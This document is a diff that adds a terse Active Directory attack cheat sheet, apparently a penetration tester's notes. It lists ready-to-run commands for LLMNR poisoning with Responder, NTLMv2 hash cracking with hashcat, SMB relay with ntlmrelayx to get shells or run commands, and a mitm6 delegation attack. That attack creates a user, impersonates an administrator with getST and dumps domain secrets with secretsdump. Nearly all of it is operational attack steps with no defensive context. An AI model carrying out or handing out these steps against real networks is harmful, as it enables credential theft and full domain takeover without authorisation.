@@ -1,0 +1,42 @@
+Active Directory
+
+%SystemRoot%\NTDS\NTDS.dit    
+	(e.g. C:\Windows\NTDS\NTDS.dit)
+
+LLMNR Poisoning
+	run Responder or IceBreaker early in the day 
+	needs lots of traffic
+
+	python /opt/Responder/Responder.py -I <listening interface> -rdwv
+
+	Crack the Hash
+		hashcat -m 5600 hashfile.txt
+
+	Pass the Hash - SMB Relay
+		set Responder.conf to SMB=Off, HTTP=Off
+		run Responder 
+		populate targets in targets.txt
+		run ntlmrelay
+			python ntlmrelayx.py -tf targets.txt -smb2support
+
+		for interactive shell:
+			python ntlmrelayx.py -tf targets.txt -smb2support -i 
+			open new tab and run nc localhost:<port from ntlmrelayx>
+				nc 127.0.0.1 11000
+
+		for meterpreter shell:
+			-e 
+		for command:
+			-c "whoami"
+
+Uncontrained Delegation
+		run in parallel:
+			mitm6 -hw <victim PC name> -d <domain> --ignore-nofqdn
+			ntlmrelayx.py -t ldaps://<victim DC IP or address> -wh <attacker_fakehost> --delegate-access
+		after ntlmrelayx creates a user:
+			getST.py -spn cifs/<victim PC name>.<domain> <domain>/<user created by ntlmrelayx> -impersonate admin
+				NOTE: escape any symbols in username with \
+		export KRB5CCNAME=admin.cache
+		secretsdump.py -k -no-pass <victim PC name>.<domain>
+
+
